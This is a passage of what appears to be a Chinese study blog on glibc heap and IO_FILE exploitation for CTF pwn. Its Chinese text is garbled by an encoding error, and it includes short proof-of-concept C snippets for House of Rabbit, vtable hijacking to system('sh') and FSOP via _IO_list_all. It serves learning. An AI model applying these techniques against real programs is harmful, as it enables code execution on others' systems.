</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p> victim ä¼šè¢«æ”¾å…¥åˆ° unsort bin ä¸­å»ï¼Œç„¶åä¸‹ä¸€æ¬¡åˆ†é…çš„å¤§å°å¦‚æœæ¯”å®ƒå¤§ï¼Œé‚£ä¹ˆå°†ä» top chunk ä¸Šåˆ†é…ç›¸åº”å¤§å°ï¼Œè€Œè¯¥ chunk ä¼šè¢«å–ä¸‹ link åˆ°ç›¸åº”çš„ bin ä¸­ã€‚å¦‚æœæ¯”å®ƒå° (ç›¸ç­‰åˆ™ç›´æ¥è¿”å›)ï¼Œåˆ™ä»è¯¥ chunk ä¸Šåˆ‡é™¤ç›¸åº”å¤§å°ï¼Œå¹¶è¿”å›ç›¸åº” chunkï¼Œå‰©ä¸‹çš„æˆä¸º last reminder chunk , è¿˜æ˜¯å­˜åœ¨ unsorted bin ä¸­ã€‚ </p>
</blockquote>
<h4 id="House-of-Orangeï¼ˆæ— freeï¼‰"><a href="#House-of-Orangeï¼ˆæ— freeï¼‰" class="headerlink" title="House of Orangeï¼ˆæ— freeï¼‰"></a>House of Orangeï¼ˆæ— freeï¼‰</h4><p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<p> é¢˜ç›®ä¸­ä¸å­˜åœ¨ free å‡½æ•°æˆ–å…¶ä»–é‡Šæ”¾å †å—çš„å‡½æ•°æ‰€ä»¥ã€‚è§£å†³è¯¥é¢˜æ˜¯ä¸ºäº†é€šè¿‡æ¼æ´åˆ©ç”¨è·å¾— free çš„æ•ˆæœã€‚ </p>
<p><strong>æ–¹æ³•ï¼š</strong></p>
<p> å½“å‰å †çš„ top chunk å°ºå¯¸ä¸è¶³ä»¥æ»¡è¶³ç”³è¯·åˆ†é…çš„å¤§å°çš„æ—¶å€™ï¼ŒåŸæ¥çš„ top chunk ä¼šè¢«é‡Šæ”¾å¹¶è¢«ç½®å…¥ unsorted bin ä¸­ï¼Œé€šè¿‡è¿™ä¸€ç‚¹å¯ä»¥åœ¨æ²¡æœ‰ free å‡½æ•°æƒ…å†µä¸‹è·å–åˆ° unsorted binsã€‚ </p>
<p>æ­£å¸¸æ£€éªŒé¡ºåºï¼š fastbinã€small binsã€unsorted binã€large bins ï¼Œtop chunk</p>
<p>å †ä»¥ brkï¼ˆæœ‰mmapå’Œbrkï¼‰ çš„å½¢å¼æ‹“å±•ï¼Œä¹‹ååŸæœ‰çš„ top chunk ä¼šè¢«ç½®äº unsorted bin ä¸­ã€‚ </p>
<p><strong>top chunk size çš„è¦æ±‚</strong></p>
<ol>
<li>ä¼ªé€ çš„ size å¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µï¼ˆ ä¸€èˆ¬å†…å­˜é¡µçš„å¤§å°æ˜¯ 4kbï¼ˆ0x1000)ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¼ªé€ çš„ size å°±å¿…é¡»è¦å¯¹é½åˆ°è¿™ä¸ªå°ºå¯¸ ï¼‰</li>
<li>size è¦å¤§äº MINSIZE(0x10)</li>
<li>size è¦å°äºä¹‹åç”³è¯·çš„ chunk size + MINSIZE(0x10)</li>
<li>size çš„ prev inuse ä½å¿…é¡»ä¸º 1</li>
</ol>
<p>ä¹‹ååŸæœ‰çš„ top chunk å°±ä¼šæ‰§è¡Œ<code>_int_free</code>ä»è€Œé¡ºåˆ©è¿›å…¥ unsorted bin ä¸­ã€‚</p>
<p><strong>ä¾‹å­</strong></p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748610375309.png" alt="1748610375309"></p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748610510856.png" alt="1748610510856"></p>
<p>å°±æ˜¯top chunkæ‰€åœ¨ä½ç½®ï¼ˆ0x602020)åŠ ä¸Šå…¶sizeçš„åå››ä½ä¸º0x1000ï¼ˆæ‰€ä»¥fake_sizeå¤§å° 0x0fe1ã€0x1fe1ã€0x2fe1ã€0x3fe1  ç­‰ï¼‰</p>
<p>ä¿®æ”¹ï¼š<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748610635311.png" alt="1748610635311"></p>
<p>vmmapå¯æŸ¥çœ‹<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748610655076.png" alt="1748610655076"></p>
<p>æœ€åæˆæœï¼š</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748610884761.png" alt="1748610884761"></p>
<p>å°±å¯ä»¥è·å¾—main_arenaçš„åœ°å€</p>
<h4 id="House-of-Rabbit-ä¸€èˆ¬ä¸ºfast-bin"><a href="#House-of-Rabbit-ä¸€èˆ¬ä¸ºfast-bin" class="headerlink" title="House of Rabbit(ä¸€èˆ¬ä¸ºfast bin)"></a>House of Rabbit(ä¸€èˆ¬ä¸ºfast bin)</h4><p>fastbinä¸ºå•å‘é“¾è¡¨ï¼Œåè¿›åå‡º</p>
<p><strong>æ–¹æ³•ï¼š</strong></p>
<p> åˆ©ç”¨äº†åœ¨ malloc consolidate çš„æ—¶å€™ fastbin ä¸­çš„å †å—è¿›è¡Œåˆå¹¶æ—¶ size æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ä»è€Œä¼ªé€ ä¸€ä¸ªå‡çš„å †å—ï¼Œä¸ºè¿›ä¸€æ­¥çš„åˆ©ç”¨åšå‡†å¤‡ã€‚ </p>
<p><strong>å‰æï¼š</strong></p>
<p>â€‹        1.å¯ä»¥ä¿®æ”¹ fastbin çš„ fd æŒ‡é’ˆæˆ– size </p>
<p>â€‹        2.å¯ä»¥è§¦å‘ malloc consolidate(merge top æˆ– malloc big chunk ç­‰ç­‰) </p>
<p><strong>malloc consolidateï¼š</strong></p>
<p>ä»…åœ¨åˆ†é…å†…å­˜æ—¶è§¦å‘ï¼Œä¸“é—¨å¤„ç† fast bin ä¸­çš„å—ï¼Œå¼ºåˆ¶åˆå¹¶ç›¸é‚»ç©ºé—²å—ï¼Œå¹¶å°†ç»“æœæ”¾å…¥ unsorted binã€‚ </p>
<p>æ‰€ä»¥ä¾‹å­1ä¸­<code>malloc(0x1000);</code>0x1000æ˜¯ä¸ºäº†å°†unsortedbinä¸­åˆå¹¶çš„chunkæ”¾åˆ°small binä¸­</p>
<p><strong>ä¾‹å­1ï¼š modify the size of fastbin chunk</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> unsigned long* chunk1=malloc(0x40); //0x602000`</span><br><span class="line">`unsigned long* chunk2=malloc(0x40); //0x602050 `</span><br><span class="line">`malloc(0x10);é˜²æ­¢topchunkåˆå¹¶ `</span><br><span class="line"> free(chunk1); `</span><br><span class="line">`free(chunk2);`</span><br><span class="line"> chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1 `</span><br><span class="line">`malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate` </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ•ˆæœï¼šè¾¾åˆ°overlap<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748612258723.png" alt="1748612258723"></p>
<p><strong>ä¾‹å­2 :modify FD pointer</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">`unsigned long* chunk1=malloc(0x40); //0x602000 `</span><br><span class="line">`unsigned long* chunk2=malloc(0x100);//0x602050 `</span><br><span class="line">`chunk2[1]=0x31; //fake chunk size 0x30 `</span><br><span class="line">`chunk2[7]=0x21  //fake chunk&#x27;s next chunk `</span><br><span class="line">`chunk2[11]=0x21 //fake chunk&#x27;s next chunk&#x27;s next chuck` </span><br><span class="line">`free(chunk1); `</span><br><span class="line">`chuck1[0]=0x602060;// modify the fd of chunk1` </span><br><span class="line">`malloc(5000);// malloc a  big chunk to trigger malloc consolidate` </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>æ€»ç»“ï¼š</strong></p>
<p>â€‹         ä¿®æ”¹ fastbin chunk çš„ size(å¦‚ä¸Šé¢çš„ POC 1 æ‰€ç¤º) ç›´æ¥æ„é€  overlap chunkï¼Œæˆ–è€…ä¿®æ”¹ fd(å¦‚é¢çš„ POC 2 æ‰€ç¤º)ï¼Œè®©å®ƒæŒ‡å‘ä¸€ä¸ª fake chunkï¼Œè§¦å‘ malloc consolidate ä¹‹åè®©è¿™ä¸ª fake chunk æˆä¸ºä¸€ä¸ªåˆæ³•çš„ chunkã€‚ </p>
<h4 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h4><p>  fastbin attack å’Œ Unsortbin attack ç»“åˆçš„ä¸€ä¸ªå° trickã€‚ è¯¥æŠ€æœ¯ç”¨äº bypass ALSRï¼Œåˆ©ç”¨ 12-bit çš„çˆ†ç ´æ¥è¾¾åˆ°è·å– shell çš„ç›®çš„ã€‚ä¸”ä»…ä»…åªéœ€è¦ä¸€ä¸ª UAF æ¼æ´ä»¥åŠèƒ½åˆ›å»ºä»»æ„å¤§å°çš„ chunk çš„æƒ…å†µä¸‹å°±èƒ½å®Œæˆåˆ©ç”¨ã€‚</p>
<h4 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h4><p> House of Pig æ˜¯ä¸€ä¸ªå°† Tcache Stash Unlink+ Attack å’Œ FSOP ç»“åˆçš„æ”»å‡»ï¼ŒåŒæ—¶ä½¿ç”¨åˆ°äº† Largebin Attack è¿›è¡Œè¾…åŠ©ã€‚ ä¸”ç¨‹åºä¸­ä»…æœ‰calloc.  </p>
<p><strong>æ¡ä»¶ï¼š</strong></p>
<p>â€‹     1.å­˜åœ¨ UAF</p>
<p>â€‹     2.èƒ½æ‰§è¡Œ abort æµç¨‹æˆ–ç¨‹åºæ˜¾å¼è°ƒç”¨ exit æˆ–ç¨‹åºèƒ½é€šè¿‡ä¸»å‡½æ•°è¿”å› </p>
<p><strong>åˆ©ç”¨æµç¨‹</strong></p>
<ol>
<li>è¿›è¡Œä¸€ä¸ª Tcache Stash Unlink+ æ”»å‡»ï¼ŒæŠŠåœ°å€ <code>__free_hook - 0x10</code> å†™å…¥ tcache_pthread_structã€‚ç”±äºè¯¥æ”»å‡»è¦æ±‚ <code>__free_hook - 0x8</code> å¤„å­˜å‚¨ä¸€ä¸ªæŒ‡å‘å¯å†™å†…å­˜çš„æŒ‡é’ˆï¼Œæ‰€ä»¥åœ¨æ­¤ä¹‹å‰éœ€è¦è¿›è¡Œä¸€æ¬¡ large bin attackã€‚</li>
<li>å†è¿›è¡Œä¸€ä¸ª large bin attackï¼Œä¿®æ”¹ <code>_IO_list_all</code> ä¸ºä¸€ä¸ªå †åœ°å€ï¼Œç„¶ååœ¨è¯¥å¤„ä¼ªé€  <code>_IO_FILE</code> ç»“æ„ä½“ã€‚</li>
<li>é€šè¿‡ä¼ªé€ çš„ç»“æ„ä½“è§¦å‘ <code>_IO_str_overflow</code> getshellã€‚</li>
<li></li>
</ol>
<h2 id="I-Ofile"><a href="#I-Ofile" class="headerlink" title="I&#x2F;Ofile"></a>I&#x2F;Ofile</h2><h4 id="1-Fileç»“æ„"><a href="#1-Fileç»“æ„" class="headerlink" title="1.Fileç»“æ„"></a>1.Fileç»“æ„</h4><p>fileåœ¨æ–‡ä»¶æµï¼Œåˆ†é…åœ¨å †ä¸­ï¼Œ FILE ç»“æ„ä¼šé€šè¿‡_chain åŸŸå½¼æ­¤è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨å¤´éƒ¨ç”¨å…¨å±€å˜é‡_IO_list_all è¡¨ç¤ºï¼Œé€šè¿‡è¿™ä¸ªå€¼æˆ‘ä»¬å¯ä»¥éå†æ‰€æœ‰çš„ FILE ç»“æ„ã€‚  åœ¨æ ‡å‡† I&#x2F;O åº“ä¸­ï¼Œæ¯ä¸ªç¨‹åºå¯åŠ¨æ—¶æœ‰ä¸‰ä¸ªæ–‡ä»¶æµæ˜¯è‡ªåŠ¨æ‰“å¼€çš„ï¼šstdinã€stdoutã€stderrã€‚å› æ­¤åœ¨åˆå§‹çŠ¶æ€ä¸‹ï¼Œ_IO_list_all æŒ‡å‘äº†ä¸€ä¸ªæœ‰è¿™äº›æ–‡ä»¶æµæ„æˆçš„é“¾è¡¨ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸‰ä¸ªæ–‡ä»¶æµä½äº libc.so çš„æ•°æ®æ®µã€‚è€Œæˆ‘ä»¬ä½¿ç”¨ fopen åˆ›å»ºçš„æ–‡ä»¶æµæ˜¯åˆ†é…åœ¨å †å†…å­˜ä¸Šçš„ã€‚ </p>
<p>åœ¨ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œ32 ä½çš„ vtable åç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8 ã€‚</p>
<p>fileå®é™…ç»“æ„ï¼š</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748794261839.png" alt="1748794261839"></p>
<p> vtable æ˜¯ IO_jump_t ç±»å‹çš„æŒ‡é’ˆï¼ŒIO_jump_t ä¸­ä¿å­˜äº†ä¸€äº›å‡½æ•°æŒ‡é’ˆ </p>
<p> vtableå†…ç»“æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> void * funcs[] = &#123;</span><br><span class="line">   1 NULL, // &quot;extra word&quot;</span><br><span class="line">   2 NULL, // DUMMY</span><br><span class="line">   3 exit, // finish  #close</span><br><span class="line">   4 NULL, // overflow</span><br><span class="line">   5 NULL, // underflow</span><br><span class="line">   6 NULL, // uflow</span><br><span class="line">   7 NULL, // pbackfail</span><br><span class="line">   8 NULL, // xsputn  #printf,write</span><br><span class="line">   9 NULL, // xsgetn  #read</span><br><span class="line">   10 NULL, // seekoff</span><br><span class="line">   11 NULL, // seekpos</span><br><span class="line">   12 NULL, // setbuf   #exit</span><br><span class="line">   13 NULL, // sync</span><br><span class="line">   14 NULL, // doallocate</span><br><span class="line">   15 NULL, // read</span><br><span class="line">   16 NULL, // write</span><br><span class="line">   17 NULL, // seek</span><br><span class="line">   18 pwn,  // close</span><br><span class="line">   19 NULL, // stat</span><br><span class="line">   20 NULL, // showmanyc</span><br><span class="line">   21 NULL, // imbue</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>1.fread</strong></p>
<p> ä»æ–‡ä»¶æµä¸­è¯»æ•°æ® </p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748794334930.png" alt="1748794334930"></p>
<p> çœŸæ­£çš„åŠŸèƒ½å®ç°åœ¨å­å‡½æ•°IO_sgetn ä¸­ã€‚  åœ¨IO_sgetn å‡½æ•°ä¸­ä¼šè°ƒç”¨IO_XSGETNï¼Œè€ŒIO_XSGETN æ˜¯IO_FILE_plus.vtable ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ä¼šé¦–å…ˆå–å‡º vtable ä¸­çš„æŒ‡é’ˆç„¶åå†è¿›è¡Œè°ƒç”¨ã€‚ æ‰€ä»¥ åœ¨é»˜è®¤æƒ…å†µä¸‹å‡½æ•°æŒ‡é’ˆæ˜¯æŒ‡å‘<strong>IO_file_xsgetn</strong> å‡½æ•°çš„ï¼Œ </p>
<p><strong>2.fwrite</strong></p>
<p> å‘æ–‡ä»¶æµå†™å…¥æ•°æ® </p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748794470950.png" alt="1748794470950"></p>
<p> ä¸»è¦æ˜¯è°ƒç”¨_IO_XSPUTN æ¥å®ç°å†™å…¥çš„åŠŸèƒ½ã€‚ </p>
<p> åœ¨IO_XSPUTN å¯¹åº”çš„é»˜è®¤å‡½æ•°<strong>IO_new_file_xsputn</strong> ä¸­ä¼šè°ƒç”¨åŒæ ·ä½äº vtable ä¸­çš„_IO_OVERFLOW </p>
<p> IO_OVERFLOW é»˜è®¤å¯¹åº”çš„å‡½æ•°æ˜¯IO_new_file_overflow </p>
<p><strong>3.fopen</strong></p>
<p> ç”¨äºæ‰“å¼€æ–‡ä»¶ ï¼ˆ <strong>_IO_file_fopen</strong> ï¼‰</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748794598974.png" alt="1748794598974"></p>
<img src="C:\Users\shizihang\AppData\Roaming\Typora\typora-user-images\1748794625711.png" alt="1748794625711" style="zoom:50%;" />

<p><strong>4.fclose</strong></p>
<p> å…³é—­å·²æ‰“å¼€æ–‡ä»¶çš„å‡½æ•°ï¼ˆ <strong>_IO_file_finish</strong>  ï¼‰ </p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748794697534.png" alt="1748794697534"></p>
<p><strong>5.printf&#x2F;puts</strong></p>
<p> printf å’Œ puts æ˜¯å¸¸ç”¨çš„è¾“å‡ºå‡½æ•°ï¼Œåœ¨ printf çš„å‚æ•°æ˜¯ä»¥â€™\nâ€™ç»“æŸçš„çº¯å­—ç¬¦ä¸²æ—¶ï¼Œprintf ä¼šè¢«ä¼˜åŒ–ä¸º puts å‡½æ•°å¹¶å»é™¤æ¢è¡Œç¬¦ã€‚ </p>
<p>puts åœ¨æºç ä¸­å®ç°çš„å‡½æ•°æ˜¯IO_putsï¼Œè¿™ä¸ªå‡½æ•°çš„æ“ä½œä¸ fwrite çš„æµç¨‹å¤§è‡´ç›¸åŒï¼Œå‡½æ•°å†…éƒ¨åŒæ ·ä¼šè°ƒç”¨ vtable ä¸­çš„IO_sputnï¼Œç»“æœä¼šæ‰§è¡Œ_IO_new_file_xsputnï¼Œæœ€åä¼šè°ƒç”¨åˆ°ç³»ç»Ÿæ¥å£ write å‡½æ•°ã€‚</p>
<p>printf çš„è°ƒç”¨æ ˆå›æº¯å¦‚ä¸‹ï¼ŒåŒæ ·æ˜¯é€šè¿‡**_IO_file_xsputn** å®ç°</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748794779471.png" alt="1748794779471"></p>
<h4 id="2-ä¼ªé€ vtableåŠ«æŒç¨‹åºæµç¨‹"><a href="#2-ä¼ªé€ vtableåŠ«æŒç¨‹åºæµç¨‹" class="headerlink" title="2.ä¼ªé€ vtableåŠ«æŒç¨‹åºæµç¨‹"></a>2.ä¼ªé€ vtableåŠ«æŒç¨‹åºæµç¨‹</h4><p><strong>1.åŸç†ï¼š</strong></p>
<p>è°ƒç”¨fwriteï¼ˆæˆ–å…¶ä»–ï¼‰æ—¶ï¼Œä¼šé€šè¿‡xsputnè°ƒç”¨ï¼Œæ­¤æ—¶å°†xsputnæ‰€æŒ‡çš„æ”¹ä¸ºsystemï¼Œå†å‘å…¶æ–‡ä»¶ä¸­å†™å…¥shæˆ–&#x2F;bin&#x2F;shï¼Œæ­¤æ—¶æ‰§è¡Œfwriteæ—¶å°±ä¼šä»xsputn(sh)å˜æˆsystem(sh).</p>
<p><strong>2.æ–¹å¼</strong></p>
<p>ä¸¤ç§ï¼š ä¸€ç§æ˜¯ç›´æ¥æ”¹å†™ vtable ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡ä»»æ„åœ°å€å†™å°±å¯ä»¥å®ç°ã€‚å¦ä¸€ç§æ˜¯è¦†ç›– vtable çš„æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„å†…å­˜ï¼Œç„¶ååœ¨å…¶ä¸­å¸ƒç½®å‡½æ•°æŒ‡é’ˆã€‚ </p>
<p><strong>3.ä¸¾ä¾‹ï¼š</strong></p>
<p>xsputnåœ¨vtableçš„ç¬¬å…«ä½</p>
<p>ç¬¬ä¸€ç§ï¼šç›´æ¥æ”¹å†™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#define system_ptr 0x7ffff7a52390;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    long long *vtable_ptr;</span><br><span class="line">    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);</span><br><span class="line">    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable</span><br><span class="line">    memcopy(fp,&quot;sh&quot;,3);</span><br><span class="line">    vtable_ptr[7]=system_ptr //xsputn</span><br><span class="line">    fwrite(&quot;hi&quot;,2,1,fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> åœ¨ç›®å‰ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œä½äº libc æ•°æ®æ®µçš„ vtable æ˜¯ä¸å¯ä»¥è¿›è¡Œå†™å…¥çš„ </p>
<p>æ”¹å–„ï¼šä¼ªé€ vtable</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#define system_ptr 0x7ffff7a52390;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    long long *vtable_addr,*fake_vtable;</span><br><span class="line">    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);</span><br><span class="line">    fake_vtable=malloc(0x40);</span><br><span class="line">    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset</span><br><span class="line">    vtable_addr[0]=(long long)fake_vtable;</span><br><span class="line">    memcpy(fp,&quot;sh&quot;,3);</span><br><span class="line">    fake_vtable[7]=system_ptr; //xsputn</span><br><span class="line">    fwrite(&quot;hi&quot;,2,1,fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="3-FSOP"><a href="#3-FSOP" class="headerlink" title="3.FSOP"></a>3.FSOP</h4><p> åŠ«æŒIO_list_all çš„å€¼æ¥ä¼ªé€ é“¾è¡¨å’Œå…¶ä¸­çš„IO_FILE é¡¹ã€‚è§¦å‘æ–¹æ³•æ˜¯è°ƒç”¨IO_flush_all_lockp ï¼Œ å¯¹åº”ç€ä¼šè°ƒç”¨IO_FILE_plus.vtable ä¸­çš„_IO_overflowã€‚ </p>
<p>è¦æ³„éœ²libc.soçš„åŸºå€ï¼š _IO_list_all æ˜¯ä½œä¸ºå…¨å±€å˜é‡å‚¨å­˜åœ¨ libc.so ä¸­çš„ï¼Œä¸æ³„æ¼ libc åŸºå€å°±ä¸èƒ½æ”¹å†™_IO_list_allã€‚ </p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748846321166.png" alt="1748846321166"></p>
<p><strong>1._IO_flush_all_lockp</strong> </p>
<p>ä¸éœ€è¦æ”»å‡»è€…æ‰‹åŠ¨è°ƒç”¨ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹è¿™ä¸ªå‡½æ•°ä¼šè¢«ç³»ç»Ÿè°ƒç”¨ï¼š</p>
<ol>
<li><p>å½“ libc æ‰§è¡Œ abort æµç¨‹æ—¶</p>
</li>
<li><p>å½“æ‰§è¡Œ exit å‡½æ•°æ—¶</p>
</li>
<li><p>å½“æ‰§è¡Œæµä» main å‡½æ•°è¿”å›æ—¶</p>
</li>
</ol>
<p><strong>2.æ¡ä»¶ï¼š</strong></p>
<p> fp-&gt;mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;IO_write_ptr &gt; fp-&gt;_IO_write_base </p>
<p><strong>3.ä¾‹å­ï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_list_all 0x7ffff7dd2520</span><br><span class="line">#define mode_offset 0xc0</span><br><span class="line">#define writeptr_offset 0x28</span><br><span class="line">#define writebase_offset 0x20</span><br><span class="line">#define vtable_offset 0xd8</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr;</span><br><span class="line">    long long *list_all_ptr;</span><br><span class="line">    ptr=malloc(0x200);</span><br><span class="line">    *(long long*)((long long)ptr+mode_offset)=0x0;</span><br><span class="line">    *(long long*)((long long)ptr+writeptr_offset)=0x1;</span><br><span class="line">    *(long long*)((long long)ptr+writebase_offset)=0x0;</span><br><span class="line">    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);</span><br><span class="line">    *(long long*)((long long)ptr+0x100+24)=0x41414141;</span><br><span class="line">    list_all_ptr=(long long *)_IO_list_all;</span><br><span class="line">    list_all_ptr[0]=ptr;</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> æˆ‘ä»¬ä½¿ç”¨åˆ†é…å†…å­˜çš„å‰ 0x100 ä¸ªå­—èŠ‚ä½œä¸º_IO_FILEï¼Œå 0x100 ä¸ªå­—èŠ‚ä½œä¸º vtableï¼Œåœ¨ vtable ä¸­ä½¿ç”¨ 0x41414141 è¿™ä¸ªåœ°å€ä½œä¸ºä¼ªé€ çš„_IO_overflow æŒ‡é’ˆã€‚ </p>
<p> ä¹‹åï¼Œè¦†ç›–ä½äº libc ä¸­çš„å…¨å±€å˜é‡ _IO_list_allï¼ŒæŠŠå®ƒæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„_IO_FILE_plusã€‚ </p>
<p> é€šè¿‡è°ƒç”¨ exit å‡½æ•°ï¼Œç¨‹åºä¼šæ‰§è¡Œ _IO_flush_all_lockpï¼Œç»è¿‡ fflush è·å–_IO_list_all çš„å€¼å¹¶å–å‡ºä½œä¸º_IO_FILE_plus è°ƒç”¨å…¶ä¸­çš„_IO_overflow </p>
<p>24æ˜¯_IO_OVERFLOWåœ¨vtableçš„ä½ç½®</p>
<h4 id="4-glibc-2-24ä¸‹çš„IO-File"><a href="#4-glibc-2-24ä¸‹çš„IO-File" class="headerlink" title="4.glibc 2.24ä¸‹çš„IO_File"></a>4.glibc 2.24ä¸‹çš„IO_File</h4><p> éªŒè¯ vtable æ˜¯å¦ä½äº_IO_vtable æ®µä¸­ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶å°±æ­£å¸¸æ‰§è¡Œï¼Œå¦åˆ™ä¼šè°ƒç”¨_IO_vtable_check åšè¿›ä¸€æ­¥æ£€æŸ¥ã€‚ </p>
<p><strong>1.æ£€æŸ¥æ–¹æ³•ï¼š</strong></p>
<p> è®¡ç®— <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>ï¼Œç´§æ¥ç€ä¼šåˆ¤æ–­ vtable - __start___libc_IO_vtables çš„ offset ï¼Œå¦‚æœè¿™ä¸ª offset å¤§äº section_length , å³å¤§äº <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> é‚£ä¹ˆå°±ä¼šè°ƒç”¨ <code>_IO_vtable_check()</code> è¿™ä¸ªå‡½æ•°ã€‚ </p>
<p><strong>2.ä¸‰å¤§æŠ€æœ¯ï¼š</strong></p>
<p> åœ¨_IO_FILE ä¸­_IO_buf_base è¡¨ç¤ºæ“ä½œçš„èµ·å§‹åœ°å€ï¼Œ_IO_buf_end è¡¨ç¤ºç»“æŸåœ°å€ï¼Œé€šè¿‡æ§åˆ¶è¿™ä¸¤ä¸ªæ•°æ®å¯ä»¥å®ç°æ§åˆ¶è¯»å†™çš„æ“ä½œã€‚ </p>
<p><strong>3.fileno ä¸ç¼“å†²åŒºçš„ç›¸å…³åˆ©ç”¨</strong> </p>
<p>ä¾‹å¦‚ï¼šscanfè°ƒç”¨åä¼šåˆå§‹åŒ–IO_Fileçš„stdinç»“æ„ï¼Œä½†å¹¶ä¸ä¼šåˆå§‹åŒ–stdoutçš„ç»“æ„</p>
